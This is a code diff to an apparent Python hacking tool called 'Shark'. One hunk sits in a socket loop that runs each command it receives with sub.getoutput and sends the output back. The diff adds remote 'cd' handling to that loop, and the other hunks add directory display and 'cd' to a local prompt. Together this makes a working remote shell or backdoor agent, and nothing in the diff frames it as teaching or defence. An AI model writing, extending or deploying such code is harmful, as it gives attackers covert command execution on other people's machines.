@@ -30,7 +30,18 @@ def inpu():
     try:
         print ("\n")
         subt = sub.getoutput("whoami")
-        data =  input(F.YELLOW+f".———[{subt}@Shark]\n|\n°———> "+ F.GREEN)
+        direc = os.getcwd()
+        num = -1
+        while True:
+            try:
+                num += 1
+                new_direc = direc.split("/")[num]
+                new_path = F.BLUE+new_direc+F.YELLOW
+            except:
+                break
+        
+
+        data =  input(F.YELLOW+f".———[{subt}@Shark]---[~/{new_path}]••<>\n|\n°———> "+ F.GREEN)
         return data
     except:
         print (F.RED+"!!!!!")
@@ -658,8 +669,17 @@ MORE Functions COMING...
                 tm.sleep(1)
                 sock.close()
                 break
-            decode_data = sub.getoutput(data)
-            sock.send(decode_data.encode())
+            elif data.startswith('cd '):
+                path = data[3:]
+                try:
+                    os.chdir(path)
+                    path = os.getcwd()
+                    sock.send(f'~{path}'.encode())
+                except:
+                    sock.send("Invalid Directory".encode())
+            else:
+                decode_data = sub.getoutput(data)
+                sock.send(decode_data.encode())
 
 
 
@@ -721,6 +741,12 @@ if __name__ == '__main__':
                 print (F.RED+"[✓]EXITING PROGRAM...")
                 tm.sleep(1)
                 break
+            elif data.startswith('cd '):
+                path = data[3:]
+                try:
+                    os.chdir(path)
+                except:
+                    print ("Dir not found")
             else:
                 sys(data)
         except:
